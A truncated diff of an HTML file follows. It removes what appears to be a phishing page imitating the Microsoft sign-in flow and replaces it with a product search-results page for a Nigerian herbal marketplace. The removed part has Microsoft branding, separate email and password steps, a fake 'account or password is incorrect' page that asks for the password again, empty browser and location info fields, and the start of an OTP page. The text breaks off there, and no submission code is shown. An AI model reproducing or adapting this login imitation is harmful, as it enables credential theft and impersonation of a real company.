@@ -1,1158 +1,775 @@
 <!DOCTYPE html>
-<html dir="ltr" class="" lang="en">
+<html lang="en">
 <head>
-    <title>Sign in to your account</title>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="-1">
-    <meta http-equiv="x-dns-prefetch-control" content="on">
-    <meta name="PageID" content="ConvergedSignIn">
-    <meta name="SiteID" content="">
-    <meta name="ReqLC" content="1033">
-    <meta name="LocLC" content="en-US">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="robots" content="none">
-    <link rel="shortcut icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMglEwCkbBSAcACAkAAcIAHYkAAAAASUVORK5CYII=">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Search Results - Hamgar Herbs Nigeria</title>
     <style>
-        /* Base styles */
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
         }
-        
+
         body {
-            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
-            background-color: #fff;
-            color: #000;
-            line-height: 1.5;
-            display: flex;
-            flex-direction: column;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwMCIgaGVpZ2h0PSI2MDAiIHZpZXdCb3g9IjAgMCAxMjAwIDYwMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNNjAwIDBDMjY4LjYgMCAwIDI2OC42IDAgNjAwSDEyMDBDNTEyMCA2MDAgNjAwIDI2OC42IDYwMCAwWiIgZmlsbD0idXJsKCNncmFkaWVudDApIiBmaWxsLW9wYWNpdHk9IjAuMDgiLz48ZGVmcz48bGluZWFyR3JhZGllbnQgaWQ9ImdyYWRpZW50MCIgeDE9IjYwMCIgeTE9IjAiIHgyPSI2MDAiIHkyPSI2MDAiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBzdG9wLWNvbG9yPSIjMDA3OGRkIi8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMDA3OGRkIiBzdG9wLW9wYWNpdHk9IjAiLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48L3N2Zz4=');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
+            color: #333;
         }
-        
-        .container {
+
+        /* Navigation */
+        .navbar {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
             display: flex;
-            flex-direction: column;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
-            flex: 1;
-            padding: 20px;
-            position: relative;
         }
-        
+
         .logo {
-            margin-bottom: 30px;
-        }
-        
-        .logo img {
-            height: 24px;
-        }
-        
-        .login-box {
-            width: 100%;
-            max-width: 440px;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-            padding: 40px;
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-        
-        .login-box:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
-        }
-        
-        .page-title {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            background: linear-gradient(135deg, #0078d4, #106ebe);
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
+            text-decoration: none;
+            letter-spacing: -1px;
         }
-        
-        .page-subtitle {
-            font-size: 14px;
-            color: #616161;
-            margin-bottom: 24px;
+
+        .nav-menu {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
         }
-        
-        .form-group {
-            margin-bottom: 16px;
+
+        .nav-menu a {
+            text-decoration: none;
+            color: #555;
+            font-weight: 600;
+            transition: all 0.3s ease;
             position: relative;
         }
-        
-        .form-control {
+
+        .nav-menu a:hover {
+            color: #667eea;
+        }
+
+        .nav-menu a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            transition: width 0.3s ease;
+        }
+
+        .nav-menu a:hover::after {
             width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #d1d1d1;
-            border-radius: 6px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            background: #fafafa;
         }
-        
-        .form-control:focus {
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #667eea;
+        }
+
+        /* Search Header */
+        .search-header {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 3rem 2rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .search-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .search-title {
+            color: white;
+            font-size: 2.5rem;
+            margin-bottom: 1.5rem;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .search-box {
+            display: flex;
+            gap: 0;
+            background: white;
+            border-radius: 50px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            transform: scale(1);
+            transition: transform 0.3s ease;
+        }
+
+        .search-box:focus-within {
+            transform: scale(1.02);
+        }
+
+        .search-input {
+            flex: 1;
+            border: none;
+            padding: 1.2rem 2rem;
+            font-size: 1.1rem;
             outline: none;
-            border-color: #0078d4;
-            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
-            background: #fff;
         }
-        
-        .form-control:valid {
-            border-color: #107c10;
-        }
-        
-        .btn {
-            display: inline-block;
-            padding: 12px 24px;
-            background: linear-gradient(135deg, #0078d4, #106ebe);
+
+        .search-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 15px;
+            padding: 0 2.5rem;
+            font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
-            text-align: center;
-            text-decoration: none;
             transition: all 0.3s ease;
+        }
+
+        .search-btn:hover {
+            padding: 0 3rem;
+            filter: brightness(1.1);
+        }
+
+        /* Main Content */
+        .main-content {
+            max-width: 1200px;
+            margin: 3rem auto;
+            padding: 0 2rem;
+        }
+
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            color: white;
+        }
+
+        .results-count {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+
+        .filter-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .filter-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        /* Product Grid */
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .product-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+
+        .product-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+        }
+
+        .product-image {
+            width: 100%;
+            height: 220px;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
             position: relative;
             overflow: hidden;
         }
-        
-        .btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+
+        .product-image::before {
+            content: '📦';
+            font-size: 4rem;
+            opacity: 0.3;
         }
-        
-        .btn:active {
-            transform: translateY(0);
+
+        .boosted-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(245, 87, 108, 0.4);
+            animation: pulse 2s infinite;
         }
-        
-        .btn-block {
-            display: block;
-            width: 100%;
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, #0078d4, #106ebe);
+
+        .product-info {
+            padding: 1.5rem;
         }
-        
-        .links {
-            margin-top: 20px;
-            font-size: 14px;
+
+        .product-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 0.5rem;
+            line-height: 1.4;
         }
-        
-        .links a {
-            color: #0078d4;
-            text-decoration: none;
-            transition: color 0.3s ease;
-            position: relative;
+
+        .product-price {
+            font-size: 1.4rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
         }
-        
-        .links a:hover {
-            color: #106ebe;
-            text-decoration: underline;
-        }
-        
-        .error-message {
-            color: #d13438;
-            background-color: #fef7f7;
-            border: 1px solid #f4d5d5;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            animation: shake 0.5s ease-in-out;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #616161;
-            background: rgba(255, 255, 255, 0.9);
-            width: 100%;
-            margin-top: auto;
-        }
-        
-        .footer a {
-            color: #616161;
-            text-decoration: none;
-            margin: 0 8px;
-            transition: color 0.3s ease;
-        }
-        
-        .footer a:hover {
-            color: #0078d4;
-            text-decoration: underline;
-        }
-        
-        .identity-banner {
+
+        .product-actions {
             display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            padding: 12px;
-            background: linear-gradient(135deg, #f3f2f1, #faf9f8);
-            border-radius: 6px;
-            border-left: 4px solid #0078d4;
+            gap: 0.8rem;
         }
-        
-        .back-button {
-            background: none;
+
+        .btn {
+            flex: 1;
+            padding: 0.8rem;
             border: none;
-            cursor: pointer;
-            margin-right: 12px;
-            padding: 8px;
-            border-radius: 4px;
-            transition: background-color 0.3s ease;
-        }
-        
-        .back-button:hover {
-            background-color: rgba(0, 120, 212, 0.1);
-        }
-        
-        .back-button svg {
-            width: 20px;
-            height: 20px;
-            fill: #0078d4;
-        }
-        
-        .identity {
-            font-size: 16px;
+            border-radius: 12px;
             font-weight: 600;
-            color: #323130;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        .checkbox-group {
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
             display: flex;
             align-items: center;
-            margin-bottom: 16px;
+            justify-content: center;
+            gap: 0.5rem;
         }
-        
-        .checkbox-group input {
-            margin-right: 8px;
+
+        .btn-view {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-view:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-call {
+            background: #48bb78;
+            color: white;
+        }
+
+        .btn-call:hover {
+            background: #38a169;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(72, 187, 120, 0.4);
+        }
+
+        .btn-fav {
+            background: #edf2f7;
+            color: #e53e3e;
+            width: 45px;
+            flex: none;
+            transition: all 0.3s ease;
+        }
+
+        .btn-fav:hover {
+            background: #fed7d7;
             transform: scale(1.1);
         }
-        
-        .otp-input {
-            font-size: 18px;
-            letter-spacing: 4px;
-            text-align: center;
-            font-weight: 600;
+
+        .btn-fav.active {
+            background: #e53e3e;
+            color: white;
         }
-        
+
+        /* Supplier Info */
+        .supplier-info {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid #e2e8f0;
+            font-size: 0.85rem;
+            color: #718096;
+        }
+
+        .supplier-avatar {
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+        }
+
+        /* Loading Animation */
         .loading {
             display: none;
             text-align: center;
-            margin: 10px 0;
-        }
-        
-        .loading-spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0078d4;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        
-        .success-message {
-            color: #107c10;
-            background-color: #f1f9f1;
-            border: 1px solid #9fd89f;
-            padding: 16px;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            text-align: center;
-            animation: fadeIn 0.5s ease-in;
-        }
-        
-        .security-indicator {
-            height: 4px;
-            background: #e1e1e1;
-            border-radius: 2px;
-            margin: 8px 0;
-            overflow: hidden;
-        }
-        
-        .security-strength {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #d13438, #ffaa44, #107c10);
-            transition: width 0.5s ease;
-        }
-        
-        .password-toggle {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #616161;
-        }
-        
-        .language-selector {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-        }
-        
-        .language-btn {
-            background: none;
-            border: 1px solid #d1d1d1;
-            padding: 6px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            color: #616161;
-            transition: all 0.3s ease;
-        }
-        
-        .language-btn:hover {
-            border-color: #0078d4;
-            color: #0078d4;
-        }
-        
-        .privacy-notice {
-            font-size: 12px;
-            color: #616161;
-            text-align: center;
-            margin-top: 20px;
-            padding: 12px;
-            background: #f8f9fa;
-            border-radius: 4px;
-        }
-        
-        .session-timeout {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #323130;
+            padding: 3rem;
             color: white;
-            padding: 12px 16px;
-            border-radius: 6px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            display: none;
-            animation: slideIn 0.3s ease;
         }
-        
-        .browser-info {
-            font-size: 10px;
-            color: #a19f9d;
-            text-align: center;
-            margin-top: 10px;
+
+        .loading.active {
+            display: block;
         }
-        
-        .location-info {
-            font-size: 10px;
-            color: #a19f9d;
-            text-align: center;
-            margin-top: 5px;
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
         }
-        
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
-        .tooltip {
-            position: relative;
-            display: inline-block;
-        }
-        
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 200px;
-            background-color: #323130;
-            color: #fff;
-            text-align: center;
-            border-radius: 6px;
-            padding: 8px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            margin-left: -100px;
+
+        /* Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
             opacity: 0;
-            transition: opacity 0.3s;
-            font-size: 12px;
+            transition: opacity 0.3s ease;
         }
-        
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
+
+        .modal-overlay.active {
+            display: flex;
             opacity: 1;
         }
-        
-        .captcha-container {
-            background: #f8f9fa;
-            padding: 16px;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            text-align: center;
+
+        .modal {
+            background: white;
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 500px;
+            width: 90%;
+            transform: scale(0.8);
+            transition: transform 0.3s ease;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
         }
-        
-        .captcha-text {
-            font-family: 'Courier New', monospace;
-            font-size: 18px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            background: linear-gradient(45deg, #666, #000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            padding: 8px;
-            border: 1px dashed #d1d1d1;
-            margin-bottom: 8px;
+
+        .modal-overlay.active .modal {
+            transform: scale(1);
         }
-        
-        .progress-bar {
-            height: 4px;
-            background: #e1e1e1;
-            border-radius: 2px;
-            margin: 16px 0;
-            overflow: hidden;
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
         }
-        
-        .progress {
-            height: 100%;
-            background: linear-gradient(90deg, #0078d4, #106ebe);
-            width: 0%;
-            transition: width 0.5s ease;
+
+        .modal-title {
+            font-size: 1.5rem;
+            color: #2d3748;
         }
-        
-        .cookie-banner {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #323130;
-            color: white;
-            padding: 16px;
-            text-align: center;
-            z-index: 1000;
-            display: none;
-        }
-        
-        .cookie-banner button {
-            background: #0078d4;
-            color: white;
+
+        .modal-close {
+            background: none;
             border: none;
-            padding: 8px 16px;
-            border-radius: 4px;
-            margin-left: 10px;
+            font-size: 1.5rem;
             cursor: pointer;
+            color: #718096;
+            transition: color 0.3s;
         }
-        
-        @media (max-width: 480px) {
-            .login-box {
-                padding: 24px;
-                margin: 10px;
+
+        .modal-close:hover {
+            color: #2d3748;
+        }
+
+        .phone-number {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #667eea;
+            text-align: center;
+            padding: 1.5rem;
+            background: #f7fafc;
+            border-radius: 12px;
+            margin: 1rem 0;
+            letter-spacing: 2px;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        /* Pagination */
+        .pagination {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 3rem;
+        }
+
+        .page-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            width: 45px;
+            height: 45px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .page-btn:hover, .page-btn.active {
+            background: white;
+            color: #667eea;
+            transform: translateY(-2px);
+        }
+
+        /* Footer */
+        .footer {
+            background: rgba(0, 0, 0, 0.2);
+            color: white;
+            text-align: center;
+            padding: 2rem;
+            margin-top: 4rem;
+            backdrop-filter: blur(10px);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .nav-menu {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background: white;
+                flex-direction: column;
+                padding: 1rem;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             }
-            
-            .container {
-                padding: 10px;
+
+            .nav-menu.active {
+                display: flex;
             }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .search-title {
+                font-size: 1.8rem;
+            }
+
+            .products-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .results-header {
+                flex-direction: column;
+                gap: 1rem;
+                text-align: center;
+            }
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: white;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            z-index: 3000;
+            font-weight: 600;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast.success {
+            border-left: 4px solid #48bb78;
+        }
+
+        .toast.error {
+            border-left: 4px solid #e53e3e;
         }
     </style>
 </head>
 <body>
-    <!-- Cookie Banner -->
-    <div class="cookie-banner" id="cookie-banner">
-        <span>We use cookies and similar technologies to help personalize content, tailor and measure ads, and provide a better experience. By clicking OK, you agree to this use.</span>
-        <button id="accept-cookies">OK</button>
-    </div>
-    
-    <div class="language-selector">
-        <button class="language-btn">English (United States) ▼</button>
-    </div>
-    
-    <div class="container">
-        <div class="logo">
-            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTA4IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik00NC41IDMuNUg2My41VjIwLjVINDQuNVYzLjVaTTQ0LjUgMEg2My41QzY1LjQzMyAwIDY3IDEuNTY3IDY3IDMuNVYyMC41QzY3IDIyLjQzMyA2NS40MzMgMjQgNjMuNSAyNEg0NC41QzQyLjU2NyAyNCA0MSAyMi40MzMgNDEgMjAuNVYzLjVDNDEgMS41NjcgNDIuNTY3IDAgNDQuNSAwWiIgZmlsbD0iIzAwNzhkNCIvPjxwYXRoIGQ9Ik0wIDMuNUgxOVYyMC41SDBWMy41Wk0wIDBIMTlDMjAuOTMzIDAgMjIuNSAxLjU2NyAyMi41IDMuNVYyMC41QzIyLjUgMjIuNDMzIDIwLjkzMyAyNCAxOSAyNEgwQy0xLjkzMyAyNCAtMy41IDIyLjQzMyAtMy41IDIwLjVWMy41Qy0zLjUgMS41NjcgLTEuOTMzIDAgMCAwWiIgZmlsbD0iIzAwNzhkNCIvPjxwYXRoIGQ9Ik04OSAzLjVIMTA4VjIwLjVIODlWMy41Wk04OSAwSDEwOEMxMDkuOTMzIDAgMTExLjUgMS41NjcgMTExLjUgMy41VjIwLjVDMTExLjUgMjIuNDMzIDEwOS45MzMgMjQgMTA4IDI0SDg5Qzg3LjA2NyAyNCA4NS41IDIyLjQzMyA4NS41IDIwLjVWMy41Qzg1LjUgMS41NjcgODcuMDY3IDAgODkgMFoiIGZpbGw9IiMwMDc4ZDQiLz48L3N2Zz4=" alt="Microsoft">
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="#" class="logo">Hamgar Herbs</a>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="#">Home</a></li>
+                <li><a href="#">My Account</a></li>
+                <li><a href="#">Contact Us</a></li>
+                <li><a href="#">How It Works</a></li>
+                <li><a href="#">Post Product</a></li>
+                <li><a href="#">Login</a></li>
+                <li><a href="#">Sign Up</a></li>
+            </ul>
+            <button class="mobile-menu-btn" onclick="toggleMenu()">☰</button>
         </div>
-        
-        <!-- Progress Bar -->
-        <div class="progress-bar" style="width: 100%; max-width: 440px; margin-bottom: 20px;">
-            <div class="progress" id="form-progress"></div>
-        </div>
-        
-        <!-- Login Page -->
-        <div id="login-page" class="login-box">
-            <h1 class="page-title">Sign in</h1>
-            <p class="page-subtitle">to continue to your account</p>
-            
-            <!-- CAPTCHA -->
-            <div class="captcha-container" id="captcha-container">
-                <div class="captcha-text" id="captcha-text">A3B8K9</div>
-                <input type="text" class="form-control" id="captcha-input" placeholder="Enter the text above" maxlength="6" required>
-                <div class="browser-info" id="browser-info"></div>
-                <div class="location-info" id="location-info"></div>
-            </div>
-            
-            <form id="login-form">
-                <div class="form-group">
-                    <input type="email" id="email" class="form-control" placeholder="Email, phone, or Skype" required>
-                </div>
-                
-                <div class="loading" id="login-loading">
-                    <div class="loading-spinner"></div>
-                    <div>Checking credentials...</div>
-                </div>
-                
-                <div class="form-group">
-                    <button type="button" id="btn-next" class="btn btn-primary btn-block">Next</button>
-                </div>
-                
-                <div class="links">
-                    <div class="form-group">
-                        <a href="#" class="tooltip">No account? Create one!
-                            <span class="tooltiptext">Sign up for a new Microsoft account</span>
-                        </a>
-                    </div>
-                    <div class="form-group">
-                        <a href="#" class="tooltip">Can't access your account?
-                            <span class="tooltiptext">Reset your password or recover your account</span>
-                        </a>
-                    </div>
-                </div>
-            </form>
-            
-            <div class="privacy-notice">
-                By signing in, you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
-            </div>
-        </div>
-        
-        <!-- Password Page -->
-        <div id="password-page" class="login-box hidden">
-            <div class="identity-banner">
-                <button class="back-button" id="back-to-login">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z" fill="#404040"/><path d="M10.944,7.056l.594.594L7.617,11.578H18v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944m0-.141-.071.07L5.929,11.929,5.858,12l.071.071,4.944,4.944.071.07.071-.07.594-.595.071-.07-.071-.071L7.858,12.522H18.1V11.478H7.858l3.751-3.757.071-.071-.071-.07-.594-.595-.071-.07Z" fill="#404040"/></svg>
-                </button>
-                <div class="identity" id="user-email"></div>
-            </div>
-            
-            <h1 class="page-title">Enter password</h1>
-            
-            <form id="password-form">
-                <div class="form-group">
-                    <input type="password" id="password" class="form-control" placeholder="Password" required>
-                    <button type="button" class="password-toggle" id="toggle-password">👁️</button>
-                    <div class="security-indicator">
-                        <div class="security-strength" id="password-strength"></div>
-                    </div>
-                </div>
-                
-                <div class="loading" id="password-loading">
-                    <div class="loading-spinner"></div>
-                    <div>Verifying your information...</div>
-                </div>
-                
-                <div class="checkbox-group">
-                    <input type="checkbox" id="keep-signed-in">
-                    <label for="keep-signed-in">Keep me signed in</label>
-                </div>
-                
-                <div class="form-group">
-                    <button type="button" id="btn-signin" class="btn btn-primary btn-block">Sign in</button>
-                </div>
-                
-                <div class="links">
-                    <div class="form-group">
-                        <a href="#" class="tooltip">Forgot password?
-                            <span class="tooltiptext">Reset your password using your recovery email or phone</span>
-                        </a>
-                    </div>
-                </div>
+    </nav>
+
+    <!-- Search Header -->
+    <div class="search-header">
+        <div class="search-container">
+            <h1 class="search-title">Search Results</h1>
+            <form class="search-box" onsubmit="handleSearch(event)">
+                <input type="text" class="search-input" id="searchInput" value="enlargement" placeholder="Search for products...">
+                <button type="submit" class="search-btn">Search</button>
             </form>
         </div>
-        
-        <!-- Error Page -->
-        <div id="error-page" class="login-box hidden">
-            <div class="identity-banner">
-                <button class="back-button" id="back-to-password">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z" fill="#404040"/><path d="M10.944,7.056l.594.594L7.617,11.578H18v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944m0-.141-.071.07L5.929,11.929,5.858,12l.071.071,4.944,4.944.071.07.071-.07.594-.595.071-.07-.071-.071L7.858,12.522H18.1V11.478H7.858l3.751-3.757.071-.071-.071-.07-.594-.595-.071-.07Z" fill="#404040"/></svg>
-                </button>
-                <div class="identity" id="error-user-email"></div>
-            </div>
-            
-            <div class="error-message">
-                <strong>Your account or password is incorrect.</strong> If you don't remember your password, <a href="#">reset it now.</a>
-            </div>
-            
-            <h1 class="page-title">Sign in</h1>
-            
-            <form id="error-form">
-                <div class="form-group">
-                    <input type="password" id="error-password" class="form-control" placeholder="Password" required>
-                    <button type="button" class="password-toggle" id="toggle-error-password">👁️</button>
-                </div>
-                
-                <div class="loading" id="error-loading">
-                    <div class="loading-spinner"></div>
-                    <div>Verifying credentials...</div>
-                </div>
-                
-                <div class="checkbox-group">
-                    <input type="checkbox" id="error-keep-signed-in">
-                    <label for="error-keep-signed-in">Keep me signed in</label>
-                </div>
-                
-                <div class="form-group">
-                    <button type="button" id="btn-try-again" class="btn btn-primary btn-block">Try Again</button>
-                </div>
-                
-                <div class="links">
-                    <div class="form-group">
-                        <a href="#" class="tooltip">Forgot password?
-                            <span class="tooltiptext">Reset your password using your recovery email or phone</span>
-                        </a>
-                    </div>
-                </div>
-            </form>
-        </div>
-        
-        <!-- OTP Page -->
-        <div id="otp-page" class="login-box hidden">
